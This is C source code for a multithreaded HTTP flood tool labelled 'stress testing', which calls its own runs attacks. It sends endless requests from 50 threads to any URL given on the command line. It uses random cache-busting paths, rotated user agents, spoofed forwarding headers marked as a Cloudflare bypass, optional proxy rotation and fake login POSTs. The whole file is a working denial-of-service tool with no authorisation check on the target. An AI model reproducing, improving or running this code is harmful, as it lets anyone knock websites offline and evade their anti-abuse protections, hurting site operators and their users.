#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <time.h>
#include <stdbool.h>
#include <curl/curl.h>

#define MAX_WORKERS 50
#define MAX_URL_LEN 2048
#define MAX_PROXIES 5000

#define COLOR_RESET "\033[0m"
#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_CYAN "\033[36m"

typedef struct {
    char proxies[MAX_PROXIES][64];
    int count;
    pthread_mutex_t mutex;
} ProxyList;

typedef struct {
    CURL *easy;
    char target_url[512];
    char mode[10];
    bool use_proxy;
} ThreadData;

ProxyList proxy_list = {0};
long long total_requests = 0;
long long total_bytes = 0;
pthread_mutex_t stats_mutex = PTHREAD_MUTEX_INITIALIZER;
volatile bool running = true;
time_t start_time;

const char *USER_AGENTS[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0",
    NULL
};

static size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
    (void)contents;
    (void)userp;
    return size * nmemb;
}

int rand_int(int min, int max) {
    return min + (rand() % (max - min + 1));
}

void load_proxies() {
    FILE *fp = fopen("proxies.txt", "r");
    if (fp) {
        char line[64];
        while (fgets(line, sizeof(line), fp) && proxy_list.count < MAX_PROXIES) {
            line[strcspn(line, "\n")] = 0;
            if (strlen(line) > 5 && strchr(line, ':')) {
                strcpy(proxy_list.proxies[proxy_list.count++], line);
            }
        }
        fclose(fp);
        printf(COLOR_GREEN "[+] Loaded %d proxies from proxies.txt\n" COLOR_RESET, proxy_list.count);
    } else {
        printf(COLOR_YELLOW "[!] No proxies.txt found, running without proxies\n" COLOR_RESET);
    }
}

char* get_random_proxy(void) {
    if (proxy_list.count == 0) return NULL;
    pthread_mutex_lock(&proxy_list.mutex);
    int idx = rand_int(0, proxy_list.count - 1);
    char *proxy = malloc(64);
    if (proxy) strcpy(proxy, proxy_list.proxies[idx]);
    pthread_mutex_unlock(&proxy_list.mutex);
    return proxy;
}

char* random_string(int n) {
    const char letters[] = "abcdefghijklmnopqrstuvwxyz0123456789";
    char *str = malloc(n + 1);
    if (!str) return NULL;
    for (int i = 0; i < n; i++) {
        str[i] = letters[rand() % (sizeof(letters) - 1)];
    }
    str[n] = '\0';
    return str;
}

void* attack_thread(void *arg) {
    ThreadData *data = (ThreadData*)arg;
    CURL *curl = curl_easy_init();
    
    if (!curl) {
        return NULL;
    }
    
    struct curl_slist *headers = NULL;
    char header_buf[256];
    
    // Setup common options
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1L);
    
    while (running) {
        char full_url[MAX_URL_LEN];
        char *path = random_string(rand_int(5, 15));
        snprintf(full_url, sizeof(full_url), "%s/%s?nocache=%d", 
                 data->target_url, path, rand_int(1, 999999));
        free(path);
        
        // Build headers
        headers = curl_slist_append(headers, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
        headers = curl_slist_append(headers, "Accept-Language: en-US,en;q=0.9");
        headers = curl_slist_append(headers, "Accept-Encoding: gzip, deflate");
        headers = curl_slist_append(headers, "Connection: keep-alive");
        headers = curl_slist_append(headers, "Upgrade-Insecure-Requests: 1");
        headers = curl_slist_append(headers, "Cache-Control: no-cache");
        
        snprintf(header_buf, sizeof(header_buf), "User-Agent: %s", USER_AGENTS[rand_int(0, 4)]);
        headers = curl_slist_append(headers, header_buf);
        
        // Cloudflare bypass
        if (rand_int(1, 100) <= 30) {
            snprintf(header_buf, sizeof(header_buf), "CF-Connecting-IP: %d.%d.%d.%d", 
                     rand_int(1,255), rand_int(0,255), rand_int(0,255), rand_int(1,254));
            headers = curl_slist_append(headers, header_buf);
            snprintf(header_buf, sizeof(header_buf), "X-Forwarded-For: %d.%d.%d.%d", 
                     rand_int(1,255), rand_int(0,255), rand_int(0,255), rand_int(1,254));
            headers = curl_slist_append(headers, header_buf);
        }
        
        curl_easy_setopt(curl, CURLOPT_URL, full_url);
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        
        if (strcmp(data->mode, "POST") == 0) {
            char post_data[128];
            snprintf(post_data, sizeof(post_data), "user=test%d&pass=pass%d", 
                     rand_int(1,9999), rand_int(1,9999));
            curl_easy_setopt(curl, CURLOPT_POST, 1L);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
        } else {
            curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
        }
        
        if (data->use_proxy) {
            char *proxy = get_random_proxy();
            if (proxy) {
                curl_easy_setopt(curl, CURLOPT_PROXY, proxy);
                curl_easy_setopt(curl, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
                free(proxy);
            }
        }
        
        CURLcode res = curl_easy_perform(curl);
        
        if (res == CURLE_OK) {
            pthread_mutex_lock(&stats_mutex);
            total_requests++;
            total_bytes += strlen(full_url);
            pthread_mutex_unlock(&stats_mutex);
        }
        
        curl_slist_free_all(headers);
        headers = NULL;
        
        usleep(1000);
    }
    
    curl_easy_cleanup(curl);
    return NULL;
}

void* stats_thread(void *arg) {
    (void)arg;
    
    while (running) {
        sleep(1);
        
        time_t now = time(NULL);
        double elapsed = difftime(now, start_time);
        
        pthread_mutex_lock(&stats_mutex);
        long long req = total_requests;
        long long bytes = total_bytes;
        pthread_mutex_unlock(&stats_mutex);
        
        if (elapsed > 0) {
            double rps = req / elapsed;
            double mbps = (bytes * 8) / (elapsed * 1000000);
            
            printf("\r\033[K");
            printf(COLOR_RED "[⚡] " COLOR_RESET);
            printf(COLOR_GREEN "RPS: %.0f " COLOR_RESET, rps);
            printf(COLOR_YELLOW "Total: %lld " COLOR_RESET, req);
            printf(COLOR_CYAN "MB/s: %.1f " COLOR_RESET, mbps);
            printf(COLOR_GREEN "Workers: %d" COLOR_RESET, MAX_WORKERS);
            fflush(stdout);
        }
    }
    
    return NULL;
}

void signal_handler(int sig) {
    if (sig == SIGINT || sig == SIGTERM) {
        printf(COLOR_YELLOW "\n[!] Shutting down...\n" COLOR_RESET);
        running = false;
    }
}

void print_banner() {
    printf(COLOR_RED);
    printf("\n");
    printf("    ╔════════════════════════════════════════════════════════════╗\n");
    printf("    ║                                                            ║\n");
    printf("    ║     ██████╗ █████╗ ███████╗███████╗██╗   ██╗██████╗       ║\n");
    printf("    ║    ██╔════╝██╔══██╗╚══███╔╝╚══███╔╝╚██╗ ██╔╝██╔══██╗      ║\n");
    printf("    ║    ██║     ███████║  ███╔╝   ███╔╝  ╚████╔╝ ██║  ██║      ║\n");
    printf("    ║    ██║     ██╔══██║ ███╔╝   ███╔╝    ╚██╔╝  ██║  ██║      ║\n");
    printf("    ║    ╚██████╗██║  ██║███████╗███████╗   ██║   ██████╔╝      ║\n");
    printf("    ║     ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝   ╚═╝   ╚═════╝       ║\n");
    printf("    ║                                                            ║\n");
    printf("    ║               STRESS TESTING TOOL v6.0                     ║\n");
    printf("    ║                                                            ║\n");
    printf("    ╚════════════════════════════════════════════════════════════╝\n");
    printf(COLOR_RESET);
}

int main(int argc, char *argv[]) {
    if (argc < 4) {
        print_banner();
        printf("\n");
        printf(COLOR_RED "    Usage: %s <url> <seconds> <GET|POST> [proxy]\n" COLOR_RESET, argv[0]);
        printf(COLOR_CYAN "    Example: %s https://example.com 60 GET\n", argv[0]);
        printf(COLOR_CYAN "    Example: %s https://example.com 30 POST proxy\n", argv[0]);
        printf(COLOR_YELLOW "\n    For proxies: Create proxies.txt with one proxy per line (ip:port)\n" COLOR_RESET);
        printf("\n");
        return 1;
    }
    
    srand(time(NULL));
    
    char *target_url = argv[1];
    int duration = atoi(argv[2]);
    char *mode = argv[3];
    bool use_proxy = (argc >= 5 && strcmp(argv[4], "proxy") == 0);
    
    curl_global_init(CURL_GLOBAL_ALL);
    
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    if (use_proxy) {
        load_proxies();
    }
    
    print_banner();
    printf(COLOR_GREEN "\n    [🎯] Target: %s\n" COLOR_RESET, target_url);
    printf(COLOR_GREEN "    [⏱️]  Duration: %d seconds\n" COLOR_RESET, duration);
    printf(COLOR_GREEN "    [⚙️]  Mode: %s\n" COLOR_RESET, mode);
    printf(COLOR_GREEN "    [🚀] Workers: %d\n" COLOR_RESET, MAX_WORKERS);
    if (use_proxy && proxy_list.count > 0) {
        printf(COLOR_GREEN "    [🌐] Proxies: %d\n" COLOR_RESET, proxy_list.count);
    }
    
    printf(COLOR_YELLOW "\n    [💀] Starting attack... Press Ctrl+C to stop\n\n" COLOR_RESET);
    
    start_time = time(NULL);
    running = true;
    
    pthread_t workers[MAX_WORKERS];
    ThreadData thread_data[MAX_WORKERS];
    
    for (int i = 0; i < MAX_WORKERS; i++) {
        memset(&thread_data[i], 0, sizeof(ThreadData));
        strncpy(thread_data[i].target_url, target_url, sizeof(thread_data[i].target_url) - 1);
        strncpy(thread_data[i].mode, mode, sizeof(thread_data[i].mode) - 1);
        thread_data[i].use_proxy = use_proxy;
        
        if (pthread_create(&workers[i], NULL, attack_thread, &thread_data[i]) != 0) {
            printf(COLOR_RED "[!] Failed to create thread %d\n" COLOR_RESET, i);
        }
    }
    
    pthread_t stats_tid;
    pthread_create(&stats_tid, NULL, stats_thread, NULL);
    
    sleep(duration);
    running = false;
    
    for (int i = 0; i < MAX_WORKERS; i++) {
        pthread_join(workers[i], NULL);
    }
    pthread_join(stats_tid, NULL);
    
    printf(COLOR_RED "\n\n    ╔════════════════════════════════════════════════════════════╗\n");
    printf(COLOR_RED "    ║                    ATTACK COMPLETED!                        ║\n");
    printf(COLOR_RED "    ╠════════════════════════════════════════════════════════════╣\n");
    printf(COLOR_CYAN "    ║  Total Requests: %-52lld ║\n", total_requests);
    printf(COLOR_CYAN "    ║  Total Data: %-52.2f MB ║\n", total_bytes / (1024.0 * 1024.0));
    if (duration > 0) {
        printf(COLOR_CYAN "    ║  Average RPS: %-55.0f ║\n", (double)total_requests / duration);
    }
    printf(COLOR_RED "    ╚════════════════════════════════════════════════════════════╝\n");
    printf(COLOR_RESET);
    
    curl_global_cleanup();
    
    return 0;
}
